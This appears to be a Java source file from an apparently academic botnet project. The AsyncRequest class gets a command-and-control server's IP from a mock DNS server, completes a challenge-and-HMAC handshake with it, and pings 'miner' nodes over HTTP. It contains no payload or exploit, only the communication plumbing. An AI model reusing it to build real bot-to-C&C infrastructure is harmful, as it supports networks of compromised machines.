package cs.sii.connection;


import com.google.common.reflect.TypeToken;

import cs.sii.model.Conversions;
import cs.sii.model.IP;
import cs.sii.model.Pairs;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClientBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.AsyncResult;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import javax.annotation.PostConstruct;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Future;




@Service("AsyncRequest")
public class AsyncRequest {


	private Integer timeoutSeconds;

	public final static Integer REQNUMBER = 6;
	
	private static final int TIMEOUT_MILLIS = 5000;
	
	private RestTemplate restTemplate=new RestTemplate();
	
	
	public AsyncRequest() {
		//restTemplate=new RestTemplate()
		
		// loadConfiguration();
	}

	//Da cambiare
	@Async
	public Future<String> pingUser(String uriMiner) {

		// SimpleClientHttpRequestFactory rf = ((SimpleClientHttpRequestFactory) restTemplate.getRequestFactory());
		// rf.setReadTimeout(1000 * 5);
		// rf.setConnectTimeout(1000 * 5);
		// restTemplate.setRequestFactory(rf);

		Integer counter = 0;
		while (counter <= REQNUMBER) {
			try {
				System.out.println("\nRichiesta ad :" + uriMiner);
//				String response = restTemplate.postForObject("http://" + uriMiner + "/user_ping", null, String.class);
				String response = doPost("http://" + uriMiner + "/user_ping", "");
				return new AsyncResult<>(response);
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("\nSono Morto: " + uriMiner + " Causa: " + e.getMessage());
				counter++;
			}

			// Aspetto prima della prossima richiesta
			try {
				Thread.sleep(250);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}

		}
		return null;
	}

	//da valutare se devono essere asincroni
	public IP getIpCommandAndControlFromDnsServer(String dnsUrl) {
		IP requestIp=new IP("");
		//String postRequest = "{\"user_ip\":\"" + myIp.getIp() + ":8080\"}";
		Type type = new TypeToken<IP>() {}.getType();
		try {
			//requestIp = doPost(dnsUrl, postRequest);
			requestIp=doGetJSON(dnsUrl,type);
			
			//System.out.println("getIpFromEntryPoint get RequestIp " + requestIp);
		} catch (Exception e) {
//			e.printStackTrace();
			System.err.println("Errore ricezione Ip da Mock Dns Server");
		}
		return requestIp;
	}
	
/*	//da valutare se devono essere asincroni
//	public String getIpBotNetFromCommandAndConquer(String url) {
//
//		System.out.println("getIpFromCommandAndConquer");
//
//		String requestIp = "";
//		String postRequest = "{\"user_ip\":\"" +  ":8080\"}";
//		try {
//			requestIp = doPost(url, postRequest);
//			System.out.println("getIpFromEntryPoint get RequestIp " + requestIp);
//		} catch (Exception e) {
////			e.printStackTrace();
//			System.err.println("Errore ricezione Ip da Entry Point");
//		}
//		System.out.println(requestIp);
//		return requestIp;
 * }
*/	

	//da valutare se devono essere asincroni
	public Pairs<Long,Long> getChallengeFromCommandAndConquer(IP ipCeC){
		Pairs<Long,Long> challenge = new Pairs<>();
		Integer counter = 0;
		while (counter <= REQNUMBER) {
		Type type=new TypeToken<Pairs<Long,Long>>(){}.getType();	
		
		try {
			String url="http://"+ipCeC+":8080/welcome";
			System.out.println("Url:"+url);
			challenge=doGetJSON(url, type);
			System.out.println(challenge.getValue2());
		
			return challenge;
		} catch (Exception e) {
//			e.printStackTrace();
			counter++;
			System.out.println("Errore ricezione Challenge");
		}		
		}
		return null;
	}
	
	//da valutare se devono essere asincroni
	public String getResponseFromCommandAndConquer(IP ip,Long keyNumber,Long iterationNumber,String hashMac){
		Integer counter = 0;
		String response = "";
		while (counter <= REQNUMBER) {
		Type type=new TypeToken<Pairs<Long,Long>>(){}.getType();
		String postRequest = "{\"hashMac\":\""+hashMac+"\"}";
		try {
			//response = doPost("http://"+ip+":8080/welcome/hmac", hashMac);
			//RestTemplate rest=new RestTemplate();
			
			response=restTemplate.postForObject("http://"+ip+":8080/hmac", hashMac, String.class);
			return response;
		} catch (Exception e) {
			//e.printStackTrace();
			System.out.println("Errore ricezione Challenge");
			counter++;
		}
		
		
	}
		return null;
	}
	
	
	public static String doGet(String url) throws Exception {
		
//		HttpPost request = new HttpPost(url);

		HttpGet request=new HttpGet(url);
		
		RequestConfig requestConfig = RequestConfig.custom().setSocketTimeout(TIMEOUT_MILLIS).setConnectTimeout(TIMEOUT_MILLIS).setConnectionRequestTimeout(TIMEOUT_MILLIS).build();

		request.setConfig(requestConfig);

		HttpClient client = HttpClientBuilder.create().build();

		HttpResponse response;
		response = client.execute(request);
		BufferedReader rd;
		rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
		StringBuffer result = new StringBuffer();
		String line = "";
		while ((line = rd.readLine()) != null) {
			result.append(line);
		}
		return result.toString();
	}

	public static String doPost(String url, String raw_data) throws Exception {

		HttpClient client = HttpClientBuilder.create().build();
		HttpPost post = new HttpPost(url);
//		List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
//		for (Pairs<?, ?> p : parameters) {
//			urlParameters.add(new BasicNameValuePair(p.getValue1().toString(), p.getValue2().toString()));
//		}
		post.setEntity(new StringEntity(raw_data));
		HttpResponse response = client.execute(post);
		BufferedReader rd;
		rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
		StringBuffer result = new StringBuffer();
		String line = "";
		while ((line = rd.readLine()) != null) {
			result.append(line);
		}
		return result.toString();
	}
	
	@SuppressWarnings("unchecked")
	public static <T> T doGetJSON(String url, Type t) throws IOException {

		HttpClient client = HttpClientBuilder.create().build();
		HttpGet request = new HttpGet(url);

		RequestConfig requestConfig = RequestConfig.custom()
			.setSocketTimeout(TIMEOUT_MILLIS)
			.setConnectTimeout(TIMEOUT_MILLIS)
			.setConnectionRequestTimeout(TIMEOUT_MILLIS)
			.build();

		request.setConfig(requestConfig);

		HttpResponse response;
		response = client.execute(request);
		BufferedReader rd;
		rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
		StringBuffer result = new StringBuffer();
		String line = "";
		while ((line = rd.readLine()) != null) {
			result.append(line);
		}
		
		return Conversions.fromJson(result.toString(), t);
	}
	
	public int getTimeoutSeconds() {
		return timeoutSeconds;
	}

	public void setTimeoutSeconds(int timeoutSeconds) {

		this.timeoutSeconds = timeoutSeconds;
	}
	
}
